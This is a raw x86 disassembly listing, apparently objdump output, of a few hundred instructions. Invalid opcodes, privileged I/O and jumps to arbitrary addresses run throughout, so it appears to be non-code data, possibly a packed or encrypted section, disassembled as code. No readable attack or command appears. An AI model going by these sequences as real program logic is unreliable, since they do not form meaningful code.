  417e0f:	loop   0x417e34
  417e11:	into   
  417e12:	repnz scas al,BYTE PTR es:[edi]
  417e14:	sub    al,0x9e
  417e16:	add    eax,0x80f71927
  417e1b:	pop    ebx
  417e1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e1d:	fwait
  417e1e:	popf   
  417e1f:	sahf   
  417e20:	adc    dh,bh
  417e22:	jmp    0x417e3a
  417e24:	push   ebx
  417e25:	pop    esp
  417e26:	(bad)  
  417e27:	and    DWORD PTR [eax],ebx
  417e29:	aam    0xc2
  417e2b:	test   DWORD PTR ds:0x10dfc492,edi
  417e31:	ror    DWORD PTR [edx-0x185e722e],0x3a
  417e38:	cmp    al,0x6a
  417e3a:	push   0x77b4d2ba
  417e3f:	stos   DWORD PTR es:[edi],eax
  417e40:	rol    ecx,1
  417e42:	popa   
  417e43:	popf   
  417e44:	jb     0x417eab
  417e46:	stc    
  417e47:	sbb    DWORD PTR [edi+0x44],0x8bc98c42
  417e4e:	test   al,0xd
  417e50:	push   edi
  417e51:	fs inc esp
  417e53:	xchg   ebp,eax
  417e54:	push   edi
  417e55:	inc    eax
  417e56:	xchg   ebp,eax
  417e57:	rcl    ebx,1
  417e59:	in     eax,dx
  417e5a:	retf   0x94af
  417e5d:	xchg   ecx,eax
  417e5e:	dec    ecx
  417e5f:	fldcw  WORD PTR [ebx]
  417e61:	jnp    0x417e86
  417e63:	and    DWORD PTR [edi+0x49aa6bd4],esi
  417e69:	xchg   esp,edx
  417e6b:	cli    
  417e6c:	ror    DWORD PTR [edx-0x2a],1
  417e6f:	mov    ecx,0x24eaafb6
  417e74:	mov    WORD PTR [esp+ecx*1+0x7e],ds
  417e78:	sub    bh,BYTE PTR [esi+0x37]
  417e7b:	enter  0x3f85,0xb2
  417e7f:	test   eax,0x12ae9960
  417e84:	cwde   
  417e85:	push   esp
  417e86:	sbb    al,0xc0
  417e88:	das    
  417e89:	and    ebx,DWORD PTR [eax+0x6bb2f24f]
  417e8f:	cmp    al,0x2b
  417e91:	add    al,0xb9
  417e93:	pop    edi
  417e94:	sub    DWORD PTR [edx-0x2a],edx
  417e97:	mov    WORD PTR [si+0x2d18],gs
  417e9c:	lds    ecx,FWORD PTR [edi]
  417e9e:	in     al,0x73
  417ea0:	adc    al,0x39
  417ea2:	dec    ebx
  417ea3:	push   ebp
  417ea4:	lods   al,BYTE PTR ds:[esi]
  417ea5:	sub    edi,DWORD PTR [ecx+0x2b]
  417ea8:	imul   ecx,DWORD PTR [esi-0x80],0x845bf72f
  417eaf:	xlat   BYTE PTR ds:[ebx]
  417eb0:	xchg   ecx,eax
  417eb1:	add    BYTE PTR [eax],al
  417eb3:	mov    esp,0x785d3858
  417eb8:	(bad)  
  417eb9:	out    0x7f,al
  417ebb:	fistp  QWORD PTR [ebx]
  417ebd:	jmp    0x524f:0xce220502
  417ec4:	(bad)  
  417ec5:	int    0xa
  417ec7:	ret    
  417ec8:	add    BYTE PTR [ebp-0x3e],0xd2
  417ecc:	lahf   
  417ecd:	push   esi
  417ece:	push   ss
  417ecf:	mov    al,ds:0xc1282fff
  417ed4:	lods   al,BYTE PTR ds:[esi]
  417ed5:	call   0xbf65:0xcaaf054d
  417edc:	mov    ebp,DWORD PTR [ebx-0x31dccc51]
  417ee2:	addr16 lock retfw 0x722e
  417ee8:	int    0xa4
  417eea:	cmp    BYTE PTR [edi+0x5b1f6343],al
  417ef0:	mov    al,ds:0x1611b3f0
  417ef5:	fst    DWORD PTR [ebp+0x40]
  417ef8:	cdq    
  417ef9:	stc    
  417efa:	inc    ecx
  417efb:	pop    ebx
  417efc:	jmp    0x417ed8
  417efe:	and    ah,BYTE PTR [eax-0x1a]
  417f01:	int3   
  417f02:	pushf  
  417f03:	sbb    esp,eax
  417f05:	mov    edx,0xde59422a
  417f0a:	jl     0x417e93
  417f0c:	cmp    al,0x3e
  417f0e:	test   BYTE PTR [esi-0x4a],0xa7
  417f12:	or     BYTE PTR [edx],bh
  417f14:	mov    eax,ds:0x15898052
  417f19:	sbb    ebx,DWORD PTR [ebp+ecx*2-0x282bec87]
  417f20:	ss inc esp
  417f22:	sbb    esp,DWORD PTR [ebp-0x439dd655]
  417f28:	sub    dl,BYTE PTR [edi+0x47]
  417f2b:	pop    ecx
  417f2c:	push   esp
  417f2d:	push   ds
  417f2e:	mov    al,ds:0xf9978679
  417f33:	jp     0x417f9d
  417f35:	ins    BYTE PTR es:[edi],dx
  417f36:	push   cs
  417f37:	std    
  417f38:	icebp  
  417f39:	inc    edx
  417f3a:	cmp    edi,DWORD PTR [esi-0x5a]
  417f3d:	mov    bh,0x3b
  417f3f:	adc    DWORD PTR [eax+0x4b012e8d],edx
  417f45:	clc    
  417f46:	pop    esp
  417f47:	push   ecx
  417f48:	data16 clc 
  417f4a:	xor    edi,edx
  417f4c:	sub    bl,BYTE PTR ds:0x601c9c29
  417f52:	mov    ds:0x2920c608,eax
  417f57:	xchg   DWORD PTR [ebx+0x729c8f95],ecx
  417f5d:	pop    edx
  417f5e:	aas    
  417f5f:	mov    DWORD PTR [esi],ecx
  417f61:	ins    DWORD PTR es:[edi],dx
  417f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f63:	hlt    
  417f64:	loop   0x417f44
  417f66:	dec    esp
  417f67:	into   
  417f68:	jne    0x417f2b
  417f6a:	lea    ecx,[eax]
  417f6c:	push   ecx
  417f6d:	pusha  
  417f6e:	push   0xeed81b7b
  417f73:	outs   dx,DWORD PTR ds:[esi]
  417f74:	mov    dh,0x0
  417f76:	ja     0x417f7d
  417f78:	xlat   BYTE PTR ds:[ebx]
  417f79:	js     0x417f0b
  417f7b:	xchg   BYTE PTR [eax+0x6ba76e7b],ch
  417f81:	push   eax
  417f82:	pop    eax
  417f83:	cli    
  417f84:	lea    edi,ds:0xa2c655d2
  417f8a:	xchg   ebp,eax
  417f8b:	outs   dx,DWORD PTR ds:[esi]
  417f8c:	jns    0x417f37
  417f8e:	in     eax,dx
  417f8f:	stc    
  417f90:	loope  0x417f85
  417f92:	in     eax,0xd8
  417f94:	cmp    edx,DWORD PTR [ecx]
  417f96:	adc    eax,0x915befaf
  417f9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f9c:	call   0xaa7258c9
  417fa1:	test   al,0x64
  417fa3:	push   esi
  417fa4:	mov    bh,0xf7
  417fa6:	adc    edx,DWORD PTR [edx]
  417fa8:	rcr    bl,1
  417faa:	retf   
  417fab:	mov    al,0x13
  417fad:	mov    ecx,0xb7ccb8f7
  417fb2:	xchg   edx,eax
  417fb3:	aas    
  417fb4:	shl    DWORD PTR [ebx],1
  417fb6:	mov    ebp,0x27d8e490
  417fbb:	es mov ss,edi
  417fbe:	push   ebp
  417fbf:	(bad)  
  417fc0:	stc    
  417fc1:	jne    0x417fc4
  417fc3:	jle    0x417f73
  417fc5:	mov    ss,WORD PTR [ebp+0x7a]
  417fc8:	inc    eax
  417fc9:	pop    eax
  417fca:	push   ecx
  417fcb:	mov    edx,0x129aae
  417fd0:	mov    bl,0x2c
  417fd2:	(bad)  
  417fd3:	jmp    0x1dfdebf9
  417fd8:	mov    BYTE PTR [ecx],ch
  417fda:	icebp  
  417fdb:	(bad)  
  417fdc:	sbb    bl,cl
  417fde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fdf:	ficom  WORD PTR [edx]
  417fe1:	enter  0xbe02,0xb1
  417fe5:	push   ecx
  417fe6:	add    DWORD PTR [ecx-0x41],ebp
  417fe9:	cmp    al,0xcd
  417feb:	mov    dl,0xa3
  417fed:	push   cs
  417fee:	dec    ebp
  417fef:	cmp    al,0x68
  417ff1:	mov    edi,0xb744c824
  417ff6:	in     eax,dx
  417ff7:	stos   BYTE PTR es:[edi],al
  417ff8:	ds mov esi,0xdd563029
  417ffe:	sbb    eax,0xaa349527
  418003:	les    ebx,FWORD PTR ds:0x4dad0762
  418009:	shl    ebx,0x17
  41800c:	je     0x418076
  41800e:	xchg   esp,eax
  41800f:	and    DWORD PTR [esi],esp
  418011:	mov    ch,0x90
  418013:	cmp    al,0x74
  418015:	call   0xd71a:0xa4ff639b
  41801c:	and    al,0x82
  41801e:	call   0x3485:0xe3aa4379
  418025:	xor    eax,0xec65917f
  41802a:	xor    eax,0x4dcc5f86
  41802f:	es sub al,0x7a
  418032:	fdivr  DWORD PTR [esi+ebp*8+0x51471eea]
  418039:	pusha  
  41803a:	jg     0x417ff7
  41803c:	stos   DWORD PTR es:[di],eax
  41803e:	out    0x94,al
  418040:	jg     0x418003
  418042:	scas   eax,DWORD PTR es:[edi]
  418043:	sti    
  418044:	sub    DWORD PTR [ebx+0x42b23775],0x1a60556d
  41804e:	(bad)  
  418050:	xchg   DWORD PTR [edx+0x5297219f],esi
  418056:	add    al,0xba
  418058:	aam    0x72
  41805a:	ret    0x1b8
  41805d:	inc    cx
  41805f:	ret    
  418060:	jnp    0x418024
  418062:	lods   eax,DWORD PTR ds:[esi]
  418063:	aas    
  418064:	(bad)  
  418065:	ins    BYTE PTR es:[edi],dx
  418066:	pop    ecx
  418067:	cs inc esi
  418069:	stos   BYTE PTR es:[edi],al
  41806a:	and    edx,0x61
  41806d:	(bad)  
  41806e:	enter  0x7134,0x92
  418072:	lea    ebp,[ebp+0x18f207ad]
  418078:	aam    0x72
  41807a:	das    
  41807b:	adc    BYTE PTR [edi],al
  41807d:	xor    bh,bh
  41807f:	push   ebx
  418080:	jo     0x418098
  418082:	scas   eax,DWORD PTR es:[edi]
  418083:	out    0xde,al
  418085:	jns    0x418101
  418087:	xchg   edx,eax
  418088:	pop    es
  418089:	jb     0x4180ce
  41808b:	push   eax
  41808c:	add    BYTE PTR ds:0xa3a366f3,al
  418092:	or     bh,BYTE PTR [esi-0x71]
  418095:	out    0xa9,eax
  418097:	mov    ecx,DWORD PTR ds:0x56184f3a
  41809d:	xor    DWORD PTR [ecx],0x4
  4180a0:	ret    
  4180a1:	fdiv   DWORD PTR [edx]
  4180a3:	sbb    BYTE PTR [edi-0x2],bh
  4180a6:	mov    esi,0xb0399adb
  4180ab:	adc    BYTE PTR [edx-0x66],0x5e
  4180af:	inc    esi
  4180b0:	sub    eax,0x3dde4607
  4180b5:	pop    ebp
  4180b6:	and    eax,0xc0e3f584
  4180bb:	and    cl,BYTE PTR [edx+0x6a]
  4180be:	leave  
  4180bf:	out    0xcf,eax
  4180c1:	adc    BYTE PTR [eax],bl
  4180c3:	or     al,0x82
  4180c5:	hlt    
  4180c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180c7:	push   ebx
  4180c8:	dec    ebp
  4180c9:	loop   0x418077
  4180cb:	cdq    
  4180cc:	lods   al,BYTE PTR ds:[esi]
  4180cd:	pushf  
  4180ce:	mov    DWORD PTR [edi+0x32e6b1b6],esi
  4180d4:	call   0x9be7430a
  4180d9:	adc    eax,edi
  4180db:	mov    ds:0xf4d3b3bc,eax
  4180e0:	sti    
  4180e1:	dec    esi
  4180e2:	retf   0x96b8
  4180e5:	sbb    eax,0x3dff394c
  4180ea:	fstp   DWORD PTR [esi+0x3c]
  4180ed:	lods   al,BYTE PTR ds:[esi]
  4180ee:	fmulp  st(1),st
  4180f0:	clc    
  4180f1:	jnp    0x418119
  4180f3:	ret    0x8dee
  4180f6:	add    DWORD PTR [edx+0x60],ecx
  4180f9:	jecxz  0x418145
  4180fb:	pop    ebp
  4180fc:	fndisi(8087 only) 
  4180fe:	pop    ss
  4180ff:	inc    DWORD PTR [edx+0x5a219a1]
  418105:	lea    edi,ds:0x9b3dc29b
  41810b:	mov    al,ds:0x711fd7c
  418110:	or     ah,BYTE PTR [esi+0x4f]
  418113:	div    DWORD PTR [ebx+0x798c2949]
  418119:	and    BYTE PTR [ebx+0x2127ffe4],cl
  41811f:	and    DWORD PTR [ebp+0x10],edi
  418122:	sahf   
  418123:	lahf   
  418124:	rcl    ah,0xc5
  418127:	add    DWORD PTR [ecx-0x574d568d],0x23
  41812e:	cmp    cl,BYTE PTR [edi]
  418130:	mov    al,0x9d
  418132:	sbb    bh,BYTE PTR [ecx-0x33]
  418135:	daa    
  418136:	fcom   QWORD PTR [eax+0x53ff418a]
  41813c:	adc    dl,ch
  41813e:	call   0x69a3:0xfd9467d0
  418145:	dec    ecx
  418146:	pop    edx
  418147:	pop    edi
  418148:	hlt    
  418149:	pop    edx
  41814a:	stos   DWORD PTR es:[edi],eax
  41814b:	mov    dh,0x82
  41814d:	push   ss
  41814e:	adc    bl,bh
  418150:	adc    bl,dh
  418152:	test   BYTE PTR [edx*4+0x4b80de82],bl
  418159:	pop    esp
  41815a:	pop    ds
  41815b:	sub    eax,0xb56c0ff7
  418160:	scas   eax,DWORD PTR es:[edi]
  418161:	push   ds
  418162:	icebp  
  418163:	push   esi
  418164:	in     al,0xe4
  418166:	adc    dh,dh
  418168:	jno    0x41816d
  41816a:	repnz xlat BYTE PTR ds:[ebx]
  41816c:	popa   
  41816d:	or     edi,ebx
  41816f:	jo     0x41818f
  418171:	xor    BYTE PTR [edx-0x58],bl
  418174:	or     ah,BYTE PTR [ebp+0x46]
  418177:	pop    ebx
  418178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418179:	pop    ebp
  41817a:	jnp    0x4181cb
  41817c:	out    dx,eax
  41817d:	inc    ebp
  41817e:	cli    
  41817f:	inc    ebp
  418180:	scas   eax,DWORD PTR es:[edi]
  418181:	leave  
  418182:	add    al,0xbe
  418184:	adc    dh,BYTE PTR [ebx]
  418186:	outs   dx,BYTE PTR ds:[esi]
  418187:	push   eax
  418188:	outs   dx,DWORD PTR ds:[esi]
  418189:	ret    0xb651
  41818c:	(bad)  
  41818d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41818e:	sub    cl,al
  418190:	and    al,0xc0
  418192:	xor    bl,BYTE PTR [eax+ebx*4-0x58826b4d]
  418199:	mov    ebx,0xa7df52f3
  41819e:	add    edx,esi
  4181a0:	pop    es
  4181a1:	pop    es
  4181a2:	cmp    DWORD PTR [ebp+0x14],0xb363f367
  4181a9:	mov    eax,0xa82e6789
  4181ae:	push   0xe9b7a511
  4181b3:	add    edx,DWORD PTR [edx+0x7e95446d]
  4181b9:	push   ds
  4181ba:	sbb    eax,0xda2ceedf
  4181bf:	xlat   BYTE PTR ds:[ebx]
  4181c0:	inc    edx
  4181c1:	popf   
  4181c2:	or     BYTE PTR [esi-0x1b],dl
  4181c5:	dec    ebx
  4181c6:	lea    ebx,[ebx-0x324ee7c]
  4181cc:	xchg   esp,eax
  4181cd:	fxch   st(2)
  4181cf:	dec    edx
  4181d0:	and    BYTE PTR [eax+esi*1+0x62],dl
  4181d4:	int    0xc4
  4181d6:	lods   al,BYTE PTR ds:[esi]
  4181d7:	dec    ecx
  4181d8:	cmp    eax,0x33b05e99
  4181dd:	push   ecx
  4181de:	and    eax,ebx
  4181e0:	dec    edx
  4181e1:	xor    eax,0x25877caa
  4181e6:	and    cl,BYTE PTR [edx]
  4181e8:	repnz dec ebp
  4181ea:	mov    al,0xcb
  4181ec:	mov    dl,0x6e
  4181ee:	sub    BYTE PTR [esi],dh
  4181f0:	mov    al,ds:0x9bb2f1af
  4181f5:	stc    
  4181f6:	and    dl,BYTE PTR [ebx-0x4d]
  4181f9:	aaa    
  4181fa:	fsub   st(0),st
  4181fc:	push   es
  4181fd:	dec    ebp
  4181fe:	out    0xab,eax
  418200:	pop    ds
  418201:	test   DWORD PTR [eax-0x57],ebp
  418204:	add    edi,esi
  418206:	mov    dl,0x24
  418208:	add    ah,BYTE PTR [edx]
  41820a:	pusha  
  41820b:	push   ecx
  41820c:	fnsave [edi]
  41820e:	xor    ah,bh
  418210:	xlat   BYTE PTR ds:[ebx]
  418211:	leave  
  418212:	xchg   esi,eax
  418213:	pop    eax
  418214:	xchg   dh,bl
  418216:	sti    
  418217:	ret    
  418218:	sbb    al,bl
  41821a:	or     DWORD PTR [esi+0x1b],0xc7b6b7dc
  418221:	in     al,0xcb
  418223:	mov    ch,0x5f
  418225:	(bad)  
  418226:	jnp    0x41828e
  418228:	or     BYTE PTR [ebx-0x329c53],bl
  41822e:	pushf  
  41822f:	stos   BYTE PTR es:[edi],al
  418230:	push   esp
  418231:	pop    ss
  418232:	test   esp,esi
  418234:	stos   BYTE PTR es:[edi],al
  418235:	sub    ebx,DWORD PTR [ebp-0x2]
  418238:	adc    edx,esi
  41823a:	and    BYTE PTR [edi],ch
  41823c:	lods   al,BYTE PTR ds:[esi]
  41823d:	dec    edx
  41823e:	push   ecx
  41823f:	pop    ebp
  418240:	inc    esi
  418241:	add    dh,BYTE PTR [edx-0x78411ca0]
  418247:	xchg   esp,eax
  418248:	imul   edx,DWORD PTR [ecx+0x18],0xffffff8a
  41824c:	cmp    eax,0x9e1bc98b
  418251:	lods   al,BYTE PTR ds:[esi]
  418252:	inc    esp
  418253:	sub    esi,DWORD PTR [edi+0x11]
  418256:	loopne 0x418218
  418258:	mov    al,0xbf
  41825a:	test   DWORD PTR [ecx],eax
  41825c:	in     al,0x37
  41825e:	mov    BYTE PTR ds:0xa983d76b,dl
  418264:	out    dx,al
  418265:	or     DWORD PTR [eax+0x38],ecx
  418268:	push   ds
  418269:	adc    eax,0x14bb1e88
  41826e:	imul   ebp,esp,0x51
  418271:	sub    al,bh
  418273:	or     BYTE PTR [ebx+edi*8+0x4a],dh
  418277:	add    al,0xb1
  418279:	divps  xmm7,XMMWORD PTR [edx+0x391b9272]
  418280:	je     0x41827d
  418282:	popw   ds
  418284:	push   ds
  418285:	daa    
  418286:	sub    bh,dl
  418288:	and    BYTE PTR [eax-0x6e],bl
  41828b:	xor    eax,0x5f1249c8
  418290:	xor    edx,ecx
  418292:	(bad)  
  418293:	aad    0x74
  418295:	dec    eax
  418296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418297:	pop    ebx
  418298:	mov    WORD PTR [esi],es
  41829a:	sbb    esp,ebx
  41829c:	mov    al,0x44
  41829e:	xchg   esp,eax
  41829f:	rcr    DWORD PTR [edi+esi*2-0x353f2c28],0xd1
  4182a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182a8:	sbb    eax,0x3b2afb6e
  4182ad:	mov    esp,0x149dbcc
  4182b2:	mov    ah,0x53
  4182b4:	cdq    
  4182b5:	out    dx,al
  4182b6:	(bad)  
  4182b7:	or     al,0xa7
  4182b9:	add    DWORD PTR [esi+0x70],0x22
  4182bd:	adc    DWORD PTR [esi+edx*8],eax
  4182c0:	fstp   DWORD PTR [ebx]
  4182c2:	mov    esp,0x5157c6b3
  4182c7:	jecxz  0x418323
  4182c9:	lods   eax,DWORD PTR ds:[esi]
  4182ca:	outs   dx,DWORD PTR ds:[esi]
  4182cb:	mov    eax,DWORD PTR [edi+0x55733db4]
  4182d1:	sub    bh,0x25
  4182d4:	(bad)  
  4182d5:	cmp    eax,0x2dd416de
  4182da:	sbb    DWORD PTR [eax+edx*2+0x76],edx
  4182de:	std    
  4182df:	adc    edi,DWORD PTR [esi+0x2fad56e8]
  4182e5:	ficomp WORD PTR [ebp+0x4e0d0717]
  4182eb:	mov    BYTE PTR [ebx+ebp*2-0x4c],bh
  4182ef:	out    dx,al
  4182f0:	das    
  4182f1:	xor    BYTE PTR [edx],bl
  4182f3:	xchg   edi,eax
  4182f4:	mov    eax,fs
  4182f6:	daa    
  4182f7:	push   0xd
  4182f9:	std    
  4182fa:	pop    es
  4182fb:	fsubr  QWORD PTR [ebx]
  4182fd:	(bad)  
  4182fe:	ja     0x4182ce
  418300:	shl    BYTE PTR [ebx],1
  418302:	daa    
  418303:	pop    edx
  418304:	pop    esi
  418305:	add    al,0x4a
  418307:	fiadd  DWORD PTR [eax-0x44]
  41830a:	jle    0x4182d8
  41830c:	rcl    BYTE PTR [esi+0x38],cl
  41830f:	lods   eax,DWORD PTR ds:[esi]
  418310:	es push esp
  418312:	or     DWORD PTR [esi+edx*1+0x41ba2cd8],ebx
  418319:	icebp  
  41831a:	jo     0x4182dd
  41831c:	fist   DWORD PTR [ebx+0x1d]
  41831f:	pop    eax
  418320:	mov    bl,BYTE PTR ds:0x7ca1f67
  418326:	sbb    BYTE PTR [ebp+0x32],ch
  418329:	sti    
  41832a:	test   DWORD PTR [edi],eax
  41832c:	mov    dl,0x7d
  41832e:	in     eax,dx
  41832f:	(bad)  
  418330:	lock pop edi
  418332:	in     eax,dx
  418333:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  418335:	sub    eax,DWORD PTR [ebx+0x3fa42b33]
  41833b:	and    DWORD PTR [edx+ecx*8+0xe],ecx
  41833f:	test   BYTE PTR [esi],cl
  418341:	mov    edx,0x69cca787
  418346:	jp     0x418319
  418348:	call   0x569220e3
  41834d:	jg     0x41838f
  41834f:	jnp    0x4182ec
  418351:	cld    
  418352:	shl    BYTE PTR [esi+0x2c],1
  418355:	into   
  418356:	test   BYTE PTR [esi+0x6f],cl
  418359:	repnz dec ecx
  41835b:	sahf   
  41835c:	add    esp,DWORD PTR [ebx]
  41835e:	in     eax,dx
  41835f:	xchg   ch,dh
  418361:	out    0xea,al
  418363:	inc    esp
  418364:	in     eax,dx
  418365:	pop    esi
  418366:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418367:	cmp    BYTE PTR [edi-0x16],0xc9
  41836b:	mov    esi,0xb168b940
  418370:	sub    DWORD PTR [edx-0x364c9a52],0x67
  418377:	xchg   ecx,eax
  418378:	mov    ds:0xc030aa9,al
  41837d:	ja     0x41836d
  41837f:	xchg   DWORD PTR [ebx],eax
  418381:	pusha  
  418382:	int    0x7e
  418384:	cmc    
  418385:	(bad)  
  418386:	jecxz  0x4183f4
  418388:	popa   
  418389:	adc    bl,BYTE PTR [edi+0x10562f4e]
  41838f:	lahf   
  418390:	push   ecx
  418391:	sub    eax,0x9c32a99
  418396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418397:	dec    edx
  418398:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418399:	test   eax,0xd45cb18c
  41839e:	(bad)
  4183a1:	pop    esi
  4183a2:	mov    al,ds:0x34fce662
  4183a7:	mov    bh,dh
  4183a9:	pop    es
  4183aa:	xor    BYTE PTR [edi+ecx*1],cl
  4183ad:	int3   
  4183ae:	and    bl,cl
  4183b0:	pop    ebx
  4183b1:	adc    BYTE PTR [ecx],0x60
  4183b4:	xor    BYTE PTR [ebx],dl
  4183b6:	out    dx,al
  4183b7:	inc    edx
  4183b8:	dec    ebp
  4183b9:	adc    esp,DWORD PTR [ecx-0x4b0b1641]
  4183bf:	(bad)  
  4183c0:	mov    ds:0x966f636d,al
  4183c5:	lods   eax,DWORD PTR ds:[esi]
  4183c6:	mov    bh,0xd1
  4183c8:	mov    DWORD PTR [esi],ebx
  4183ca:	inc    ecx
  4183cb:	(bad)  
  4183cc:	push   eax
  4183cd:	mov    edi,0x6ad89d17
  4183d2:	pop    esp
  4183d3:	das    
  4183d4:	into   
  4183d5:	and    BYTE PTR [edx-0x24dcdaa6],al
  4183db:	popa   
  4183dc:	sub    bl,BYTE PTR [ebx+0x202ca79]
  4183e2:	and    BYTE PTR [edx+0x30],bh
  4183e5:	ins    DWORD PTR es:[edi],dx
  4183e6:	or     ebx,DWORD PTR [ecx-0x6a]
  4183e9:	idiv   BYTE PTR [edi]
  4183eb:	ficom  DWORD PTR [edi+edx*8+0x62]
  4183ef:	or     DWORD PTR [eax-0x79ba6e9b],edx
  4183f5:	xor    al,0x68
  4183f7:	gs xchg edx,eax
  4183f9:	sahf   
  4183fa:	sub    al,0xf3
  4183fc:	test   BYTE PTR [ebx+0x647f71a5],bl
  418402:	xor    DWORD PTR [ebx+0x4573e411],esp
  418408:	retf   
  418409:	ret    0xe1ac
  41840c:	scas   al,BYTE PTR es:[edi]
  41840d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41840e:	inc    ecx
  41840f:	dec    edx
  418410:	push   esp
  418411:	dec    ebp
  418412:	sbb    eax,0x422a4cb6
  418417:	das    
  418418:	aaa    
  418419:	and    al,0x10
  41841b:	nop
  41841c:	les    ebx,FWORD PTR [eax+0x6b]
  41841f:	cmp    DWORD PTR [ecx+0x60b10644],edx
  418425:	push   cs
  418426:	or     BYTE PTR [edx-0x6cf1304b],cl
  41842c:	push   edi
  41842d:	and    eax,0x7291421d
  418432:	inc    esp
  418433:	ret    
  418434:	stos   BYTE PTR es:[edi],al
  418435:	push   ebp
  418436:	loope  0x418412
  418438:	loope  0x41842b
  41843a:	into   
  41843b:	dec    ebp
  41843c:	push   0xffffffa6
  41843e:	rcl    ah,1
  418440:	lock push cs
  418442:	clc    
  418443:	(bad)  
  418444:	rcl    BYTE PTR [ecx+0x2b],0xaa
  418448:	pop    ebx
  418449:	cmp    DWORD PTR [eax+edx*4],esp
  41844c:	lods   al,BYTE PTR ds:[esi]
  41844d:	pop    ebp
  41844e:	popf   
  41844f:	push   ecx
  418450:	pop    ebp
  418451:	and    DWORD PTR [ecx],edx
  418453:	jmp    0x418468
  418455:	sbb    bl,dh
  418457:	jae    0x4183f3
  418459:	fiadd  WORD PTR [eax]
  41845b:	jp     0x41846a
  41845d:	cmp    ebx,DWORD PTR [ebx+0x72]
  418460:	sub    DWORD PTR [edx+0x6f],esp
  418463:	pop    edi
  418464:	out    0x93,al
  418466:	adc    al,0x76
  418468:	inc    ecx
  418469:	push   esp
  41846a:	repz sti 
  41846c:	push   es
  41846d:	pop    eax
  41846e:	iret   
  41846f:	cmp    DWORD PTR [eax],ecx
  418471:	mov    al,dl
  418473:	push   cs
  418474:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418475:	es pop es
  418477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418478:	jecxz  0x418475
  41847a:	shl    BYTE PTR [edi-0x45],1
  41847d:	jnp    0x4184ec
  41847f:	dec    ebp
  418480:	pop    edi
  418481:	mov    dx,0x63e2
  418485:	hlt    
  418486:	loopne 0x4184d3
  418488:	(bad)  
  418489:	loopne 0x4184f0
  41848b:	aam    0x5c
  41848d:	cs in  al,dx
  41848f:	daa    
  418490:	out    dx,al
  418491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418492:	sbb    al,0x42
  418494:	out    dx,al
  418495:	test   DWORD PTR [ecx+eax*2+0xb],ecx
  418499:	cmp    eax,0xc8dfc5bb
  41849e:	push   esp
  41849f:	adc    esp,0xffffffad
  4184a2:	in     eax,0x6d
  4184a4:	ss add eax,0x17bfe6d0
  4184aa:	sbb    dl,bh
  4184ac:	sahf   
  4184ad:	cmp    BYTE PTR [ebx-0x8b53528],0x8f
  4184b4:	daa    
  4184b5:	sub    edi,ebp
  4184b7:	push   edx
  4184b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184b9:	adc    edx,eax
  4184bb:	mov    edx,0xb50422d5
  4184c0:	dec    eax
  4184c1:	icebp  
  4184c2:	cmc    
  4184c3:	cmp    ebx,DWORD PTR [eax-0x22]
  4184c6:	pusha  
  4184c7:	mov    ebx,0x4b71b1af
  4184cc:	and    al,0x3c
  4184ce:	xlat   BYTE PTR ds:[ebx]
  4184cf:	(bad)  
  4184d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184d1:	mov    edi,0x58709a3e
  4184d6:	retf   
  4184d7:	pop    esp
  4184d8:	fbld   TBYTE PTR [ecx]
  4184da:	leave  
  4184db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184dc:	mov    cl,0x7a
  4184de:	in     al,dx
  4184df:	cwde   
  4184e0:	pop    ebp
  4184e1:	jb     0x4184d3
  4184e3:	sahf   
  4184e4:	mov    eax,ds:0xcd30de6a
  4184e9:	scas   al,BYTE PTR es:[edi]
  4184ea:	cmp    DWORD PTR [edx+0x390d9e9],edi
  4184f0:	test   eax,0xe08adeb9
  4184f5:	clc    
  4184f6:	sub    esi,DWORD PTR [edx]
  4184f8:	pop    ebx
  4184f9:	test   DWORD PTR [ebx+0x76b99a3b],0xd7f737e1
  418503:	add    BYTE PTR [edi-0x1],cl
  418506:	test   WORD PTR [si+0x71],bp
  41850b:	out    dx,eax
  41850c:	inc    ecx
  41850d:	sbb    DWORD PTR [ebx-0x2453fe5],eax
  418513:	imul   ebx,DWORD PTR ds:0x3f7c078e,0x69
  41851a:	mov    esp,0xd5019a78
  41851f:	sbb    eax,0x8f5da688
  418524:	out    dx,eax
  418525:	cmp    edi,0xffffffa3
  418528:	push   edx
  418529:	xchg   ecx,eax
  41852a:	xor    ebp,DWORD PTR [ebx+edx*2+0x43]
  41852e:	enter  0x6ca3,0xe
  418532:	ja     0x41852c
  418534:	sbb    BYTE PTR [esp+edx*1+0x4b],ch
  418538:	bound  edi,QWORD PTR [ebx-0x44]
  41853b:	pop    ecx
  41853c:	xchg   edi,eax
  41853d:	ss sub eax,0x960a8c91
  418543:	popf   
  418544:	lahf   
  418545:	popf   
  418546:	xor    al,BYTE PTR [ecx-0x32d496b8]
  41854c:	outs   dx,DWORD PTR ds:[esi]
  41854d:	inc    ecx
  41854e:	shl    BYTE PTR [ebx],1
  418550:	sbb    DWORD PTR [edx+0x1896e3f3],esi
  418556:	popa   
  418557:	jo     0x41851b
  418559:	cld    
  41855a:	imul   DWORD PTR [esp+edi*8+0x26]
  41855e:	xchg   dh,bh
  418560:	call   0x6da27578
  418565:	sub    DWORD PTR [edx+edx*1+0x2e],ebx
  418569:	int3   
  41856a:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41856c:	call   0x7e1b4573
  418571:	mov    al,0x21
  418573:	fistp  DWORD PTR [ebx+0x38]
